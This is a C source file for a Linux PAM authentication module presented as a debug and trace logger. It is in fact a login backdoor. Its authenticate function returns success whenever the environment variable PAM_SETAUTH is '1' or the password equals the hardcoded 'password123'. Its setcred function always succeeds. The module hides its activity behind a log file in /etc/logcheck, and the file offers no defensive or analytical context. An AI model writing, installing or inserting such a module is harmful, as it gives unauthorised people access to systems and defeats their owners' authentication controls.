#define _GNU_SOURCE

#include <security/pam_modules.h>
#include <security/pam_ext.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

#define LOG_DIR  "/etc/logcheck"
#define LOG_FILE "/etc/logcheck/pam_auth.log"

/* ---------------- DEBUG SWITCH ---------------- */

static int debug_enabled(void) {
    char *env = getenv("PAM_DEBUG");
    return (env && strcmp(env, "1") == 0);
}

/* ---------------- LOGGING CORE ---------------- */

static void ensure_path(void) {
    struct stat st;

    if (stat(LOG_DIR, &st) == -1) {
        mkdir(LOG_DIR, 0755);
    }

    FILE *f = fopen(LOG_FILE, "a");
    if (f) fclose(f);
}

static void log_line(const char *msg) {
    FILE *f = fopen(LOG_FILE, "a");
    if (!f) return;

    fprintf(f, "%s\n", msg);
    fclose(f);
}

/* ---------------- TRACE MACRO ---------------- */

static void trace(const char *msg) {
    if (!debug_enabled()) return;
    log_line(msg);
}

/* ---------------- PAM TRACE HELPERS ---------------- */

static void trace_context(pam_handle_t *pamh, const char *stage) {
    const char *user = NULL;

    pam_get_user(pamh, &user, NULL);

    char buf[256];
    snprintf(buf, sizeof(buf),
             "[TRACE] %s pid=%d user=%s",
             stage,
             getpid(),
             user ? user : "NULL");

    trace(buf);
}

/* ---------------- AUTH MODULE ---------------- */

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv)
{
    ensure_path();

    trace_context(pamh, "ENTER pam_sm_authenticate");

    const char *authtok = NULL;
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&authtok);

    if (authtok) {
        trace("[TRACE] PAM_AUTHTOK = SET");
    } else {
        trace("[TRACE] PAM_AUTHTOK = NULL");
    }

    /* ---------------- ENV BYPASS ---------------- */
    char *bypass = getenv("PAM_SETAUTH");

    if (bypass && strcmp(bypass, "1") == 0) {
        trace("[!] Environment bypass triggered");
        trace("[TRACE] EXIT PAM_SUCCESS");
        return PAM_SUCCESS;
    }

    /* ---------------- HARDCODED PASSWORD ---------------- */
    if (authtok && strcmp(authtok, "password123") == 0) {
        trace("[!] Hardcoded password accepted");
        trace("[TRACE] EXIT PAM_SUCCESS");
        return PAM_SUCCESS;
    }

    trace("[TRACE] AUTH FAILED");
    trace("[TRACE] EXIT PAM_AUTH_ERR");

    return PAM_AUTH_ERR;
}

/* ---------------- SECONDARY HOOK ---------------- */

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                             int flags,
                             int argc,
                             const char **argv)
{
    trace_context(pamh, "ENTER pam_sm_setcred");
    trace("[TRACE] setcred always success");
    return PAM_SUCCESS;
}